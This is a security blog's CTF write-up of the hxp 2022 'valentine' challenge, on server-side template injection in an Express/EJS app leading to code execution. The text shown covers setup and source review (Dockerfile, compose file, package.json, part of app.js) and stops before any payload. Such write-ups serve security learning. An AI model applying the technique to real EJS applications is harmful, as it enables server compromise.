<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" >
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="Finding SSTI in an EJS app using existing exploits and undocumented features" />
<meta property="og:locale" content="en" />
<meta name="description" content="hxp 2022 &quot;valentine&quot; wirteup is now available!" />
<meta property="og:description" content="hxp 2022 &quot;valentine&quot; wirteup is now available!" />
<link rel="canonical" href="http://localhost:4000/posts/ssti-in-ejs-app-using-undocumented-features/" />
<meta property="og:url" content="http://localhost:4000/posts/ssti-in-ejs-app-using-undocumented-features/" />
<meta property="og:site_name" content="0xbro" />
<meta property="og:image" content="http://localhost:4000/assets/img/valentine/thumbnail.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-03-28T00:00:00+02:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/assets/img/valentine/thumbnail.png" />
<meta property="twitter:title" content="Finding SSTI in an EJS app using existing exploits and undocumented features" />
<meta name="twitter:site" content="@sec_0xbro" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-03-28T00:00:00+02:00","datePublished":"2023-03-28T00:00:00+02:00","description":"hxp 2022 &quot;valentine&quot; wirteup is now available!","headline":"Finding SSTI in an EJS app using existing exploits and undocumented features","image":"http://localhost:4000/assets/img/valentine/thumbnail.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/ssti-in-ejs-app-using-undocumented-features/"},"url":"http://localhost:4000/posts/ssti-in-ejs-app-using-undocumented-features/"}</script>
<!-- End Jekyll SEO tag -->


  <title>Finding SSTI in an EJS app using existing exploits and undocumented features | 0xbro
  </title>

  <!--
  Custom Favicons - using favicon.ico only
-->

<link rel="icon" type="image/x-icon" href="/assets/img/favicons/favicon.png">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.png">

  <!-- Resource Hints -->
  
    
      
        <link rel="preconnect" href="https://fonts.googleapis.com" >
      
        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
      
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      
        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
      
    
      
        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
      
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.36.4/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
  

  <!-- Scripts -->

  <script src="/assets/js/dist/theme.min.js"></script>

  <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.18/dayjs.min.js,npm/dayjs@1.11.18/locale/en.js,npm/dayjs@1.11.18/plugin/relativeTime.js,npm/dayjs@1.11.18/plugin/localizedFormat.js,npm/tocbot@4.36.4/dist/tocbot.min.js"></script>







<script defer src="/assets/js/dist/post.min.js"></script>



<!-- Pageviews -->

  

  



  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/0xbro-light.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <a class="site-title d-block" href="/">0xbro</a>
    <p class="site-subtitle fst-italic mb-0">A penetration tester, vulnerability researcher, content creator & wannabe ethical hacker blog.</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>

      <!-- Main tabs: Talks, Side projects, About (order 1-4) -->
      
        
          <li class="nav-item">
            <a href="/about/" class="nav-link">
              <i class="fa-fw fas fa-info-circle"></i>
              <span>ABOUT</span>
            </a>
          </li>
        
      
        
          <li class="nav-item">
            <a href="/timeline/" class="nav-link">
              <i class="fa-fw fas fa-timeline"></i>
              <span>TIMELINE</span>
            </a>
          </li>
        
      
        
          <li class="nav-item">
            <a href="/disclosure/" class="nav-link">
              <i class="fa-fw fas fa-handshake"></i>
              <span>DISCLOSURE</span>
            </a>
          </li>
        
      
        
      
        
      
        
      
        
      

      <!-- Separator -->
      <li class="nav-item nav-separator">
        <hr class="sidebar-divider">
      </li>

      <!-- Blog tabs: Archive, Categories, Tags (order 5+) -->
      
        
      
        
      
        
      
        
          <li class="nav-item">
            <a href="/categories/" class="nav-link">
              <i class="fa-fw fas fa-stream"></i>
              <span>CATEGORIES</span>
            </a>
          </li>
        
      
        
          <li class="nav-item">
            <a href="/projects/" class="nav-link">
              <i class="fa-fw fas fa-code"></i>
              <span>PROJECTS</span>
            </a>
          </li>
        
      
        
          <li class="nav-item">
            <a href="/tags/" class="nav-link">
              <i class="fa-fw fas fa-tags"></i>
              <span>TAGS</span>
            </a>
          </li>
        
      
        
          <li class="nav-item">
            <a href="/archives/" class="nav-link">
              <i class="fa-fw fas fa-archive"></i>
              <span>ARCHIVES</span>
            </a>
          </li>
        
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    
      <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    

      
        <a
          href="https://github.com/0xb120"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    

      
        <a
          href="https://twitter.com/sec_0xbro"
          aria-label="twitter"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fa-brands fa-x-twitter"></i>
        </a>
      
    
          
      

      
        <a
          href="https://www.linkedin.com/in/mattia-brollo-b4129614b/"
          aria-label="linkedin"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-linkedin"></i>
        </a>
      
    
          
        

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->

    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" class="flex-shrink-0" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>Finding SSTI in an EJS app using existing exploits and undocumented features</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link" aria-label="Search">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search id="search" class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    

    
  

  
  

  




<!-- return -->










<article class="px-1" data-toc="true">
  <header>
    <h1 data-toc-skip>Finding SSTI in an EJS app using existing exploits and undocumented features</h1>
    
      <p class="post-desc fw-light mb-4">hxp 2022 &quot;valentine&quot; wirteup is now available!</p>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1679954400"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Mar 28, 2023
</time>

      </span>

      <!-- lastmod date -->
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="/assets/img/valentine/thumbnail.png" class="popup img-link preview-img shimmer"><img src="/assets/img/valentine/thumbnail.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              <a href="https://twitter.com/sec_0xbro">0xbro</a>
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="2807 words"
>
  <em>15 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  
    <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
      <span class="label text-truncate">Finding SSTI in an EJS app using existing exploits and undocumented features</span>
      <button type="button" class="toc-trigger btn me-1">
        <i class="fa-solid fa-list-ul fa-fw"></i>
      </button>
    </div>

    <button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm">
      <span class="label ps-2 pe-1">Contents</span>
      <i class="fa-solid fa-angle-right fa-fw"></i>
    </button>

    <dialog id="toc-popup" class="p-0">
      <div class="header d-flex flex-row align-items-center justify-content-between">
        <div class="label text-truncate py-2 ms-4">Finding SSTI in an EJS app using existing exploits and undocumented features</div>
        <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
          <i class="fas fa-close"></i>
        </button>
      </div>
      <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
    </dialog>
  

  <div class="content">
    <h2 id="introduction"><span class="me-2">Introduction</span><a href="#introduction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Valentine is an easy-difficulty web challenge from the <strong>hxp 2022 CTF</strong>, involving the exploitation of a <strong>Server Side Template Injection</strong> vulnerability useful to obtain remote code execution. The exploitation is possible thanks to an <strong>undocumented feature</strong> in Express and <strong>EJS</strong> that allows bypassing the security checks made by the application and rendering arbitrary templates. The intended solution adopted a similar approach but used a documented feature that will be covered in the final chapter.</p>

<h3 id="improved-skills"><span class="me-2">Improved skills</span><a href="#improved-skills" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<ul>
  <li><strong>Code review</strong> for JavaScript applications</li>
  <li>Exploit <strong>Server Side Teamplte Injection</strong> vulnerabilities</li>
  <li>Exploit <strong>undocumented features</strong> in EJS</li>
</ul>

<h3 id="video"><span class="me-2">Video</span><a href="#video" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<iframe width="560" height="315" src="https://www.youtube.com/embed/omMMpjywq64" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<hr />

<h1 id="writeup-tldr">Writeup [TL;DR]</h1>

<p>Valentine is an easy-difficulty web challenge from the hxp 2022 CTF where we can</p>
<blockquote>
  <p>Create an awesome template for your valentine and share it with the world!</p>
</blockquote>

<h2 id="setup"><span class="me-2">Setup</span><a href="#setup" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>The site provides us an archive containing the application source code as well as Docker compose file to reproduce the environment locally, and it provides also two IPs hosting the actual challenge, that however are no longer working since the CTF has finished.</p>

<ul>
  <li>Download: <a href="https://2022.ctf.link/assets/files/valentine-9455b10a15fc5519.tar.xz">https://2022.ctf.link/assets/files/valentine-9455b10a15fc5519.tar.xz</a></li>
  <li>Server: <a href="http://91.107.238.232:9086/">http://91.107.238.232:9086/</a></li>
</ul>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-[~/YT]
‚îî‚îÄ<span class="nv">$ </span>tree
<span class="nb">.</span>
‚îú‚îÄ‚îÄ valentine
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ app.js
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ docker-compose.yml
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ Dockerfile
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ flag.txt
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ index.html
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ package.json
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ package-lock.json
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ readflag
‚îî‚îÄ‚îÄ valentine-9455b10a15fc5519.tar.xz

2 directories, 9 files

</pre></td></tr></tbody></table></code></div></div>

<p>Because we have a ready-to-go docker-compose file we can start building the environment while taking a deeper look at the files contained inside the archive.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-[~/YT/valentine]
‚îî‚îÄ<span class="nv">$ </span><span class="nb">sudo </span>docker compose up
</pre></td></tr></tbody></table></code></div></div>

<h2 id="information-gathering"><span class="me-2">Information Gathering</span><a href="#information-gathering" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="files-and-configurations-review"><span class="me-2">Files and configurations review</span><a href="#files-and-configurations-review" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Taking a look at the <code class="language-plaintext highlighter-rouge">Dockerfile</code>, we can immediately notice that the application is using NodeJS, it is exposing port 3000, and that the <code class="language-plaintext highlighter-rouge">flag.txt</code> file is located inside the root folder alongside the <code class="language-plaintext highlighter-rouge">/readflag</code> binary, which probably must be used to obtain the flag.</p>

<div class="language-Dockerfile highlighter-rouge"><div class="code-header">
        <span data-label-text="Dockerfile"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre><span class="c"># see docker-compose.yml</span>

<span class="k">FROM</span><span class="s"> node:current-bullseye</span>
<span class="k">ENV</span><span class="s"> NODE_ENV=production</span>
<span class="k">WORKDIR</span><span class="s"> /app</span>

<span class="k">COPY</span><span class="s"> package.json package-lock.json app.js index.html /app/</span>
<span class="k">COPY</span><span class="s"> flag.txt readflag /</span>
<span class="k">RUN </span>npm <span class="nb">install</span>

<span class="k">RUN </span><span class="nb">mkdir </span>views
<span class="k">RUN </span><span class="nb">chown </span>node:node views

<span class="k">RUN </span><span class="nb">chown </span>root:root /flag.txt <span class="o">&amp;&amp;</span> <span class="nb">chmod </span>400 /flag.txt
<span class="k">RUN </span><span class="nb">chown </span>root:root /readflag <span class="o">&amp;&amp;</span> <span class="nb">chmod </span>4555 /readflag

<span class="k">EXPOSE</span><span class="s"> 3000</span>

<span class="k">USER</span><span class="s"> node</span>
<span class="k">CMD</span><span class="s"> node app.js</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The <code class="language-plaintext highlighter-rouge">docker-compose.yml</code> does not provide us with much info, it simply binds port 9086 to port 3000:</p>

<div class="language-yml highlighter-rouge"><div class="code-header">
        <span data-label-text="YAML"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="na">version</span><span class="pi">:</span> <span class="s2">"</span><span class="s">3"</span>
<span class="na">services</span><span class="pi">:</span>

  <span class="na">chall</span><span class="pi">:</span>
    <span class="na">build</span><span class="pi">:</span>
      <span class="na">dockerfile</span><span class="pi">:</span> <span class="s">Dockerfile</span>

    <span class="na">restart</span><span class="pi">:</span> <span class="s">always</span>
    <span class="na">ports</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="s">9086:3000</span>
</pre></td></tr></tbody></table></code></div></div>

<p>On the other hand, the <code class="language-plaintext highlighter-rouge">package.json</code> file is very interesting: it tells us that the application entry point is the <code class="language-plaintext highlighter-rouge">app.js</code> file, but even more interesting, it shows us that the application is using <code class="language-plaintext highlighter-rouge">express</code> and <code class="language-plaintext highlighter-rouge">ejs</code>, a simple templating language that lets you generate HTML markup with plain JavaScript:</p>

<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"valentine"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"1.0.0"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Create a valentine's card for your loved one"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"main"</span><span class="p">:</span><span class="w"> </span><span class="s2">"app.js"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"author"</span><span class="p">:</span><span class="w"> </span><span class="s2">"sandr0"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"license"</span><span class="p">:</span><span class="w"> </span><span class="s2">"MIT"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"dependencies"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"ejs"</span><span class="p">:</span><span class="w"> </span><span class="s2">"^3.1.8"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"express"</span><span class="p">:</span><span class="w"> </span><span class="s2">"^4.18.2"</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>The <code class="language-plaintext highlighter-rouge">index.html</code> and <code class="language-plaintext highlighter-rouge">app.js</code> files are the core of the application, but we will inspect them later after having taken an active look at the actual challenge:</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
</pre></td><td class="rouge-code"><pre><span class="c1">// app.js</span>
<span class="kd">var</span> <span class="nx">express</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">bodyParser</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">body-parser</span><span class="dl">'</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">crypto</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">path</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">path</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">fs</span><span class="dl">'</span><span class="p">);</span>

<span class="kd">var</span> <span class="nx">app</span> <span class="o">=</span> <span class="nf">express</span><span class="p">();</span>
<span class="nx">viewsFolder</span> <span class="o">=</span> <span class="nx">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="dl">'</span><span class="s1">views</span><span class="dl">'</span><span class="p">);</span>

<span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">fs</span><span class="p">.</span><span class="nf">existsSync</span><span class="p">(</span><span class="nx">viewsFolder</span><span class="p">))</span> <span class="p">{</span>
  <span class="nx">fs</span><span class="p">.</span><span class="nf">mkdirSync</span><span class="p">(</span><span class="nx">viewsFolder</span><span class="p">);</span>
<span class="p">}</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="dl">'</span><span class="s1">views</span><span class="dl">'</span><span class="p">,</span> <span class="nx">viewsFolder</span><span class="p">);</span>
<span class="nx">app</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="dl">'</span><span class="s1">view engine</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">ejs</span><span class="dl">'</span><span class="p">);</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="nx">bodyParser</span><span class="p">.</span><span class="nf">urlencoded</span><span class="p">({</span> <span class="na">extended</span><span class="p">:</span> <span class="kc">false</span> <span class="p">}))</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/template</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
